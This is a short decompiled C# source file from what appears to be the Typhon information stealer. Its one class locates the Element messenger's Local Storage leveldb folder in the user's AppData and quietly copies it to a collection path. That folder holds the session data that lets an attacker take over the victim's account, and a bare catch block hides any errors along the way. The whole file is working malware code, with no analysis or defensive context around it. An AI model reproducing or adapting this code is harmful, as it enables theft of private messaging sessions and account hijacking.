using System;
using System.IO;
using Typhon.Modules.Miscellaneous;

namespace Typhon.Stealer.Software.Messaging
{
	// Token: 0x02000011 RID: 17
	internal class Element
	{
		// Token: 0x06000055 RID: 85 RVA: 0x00004550 File Offset: 0x00002750
		public static void GetSession(string sSavePath)
		{
			if (!Directory.Exists(Element.ElementPath))
			{
				return;
			}
			string text = Path.Combine(Element.ElementPath, "leveldb");
			if (Directory.Exists(text))
			{
				try
				{
					IOHelper.CopyDirectory(text, sSavePath + "\\leveldb");
				}
				catch
				{
				}
			}
		}

		// Token: 0x0400002F RID: 47
		private static readonly string ElementPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Element\\Local Storage");
	}
}
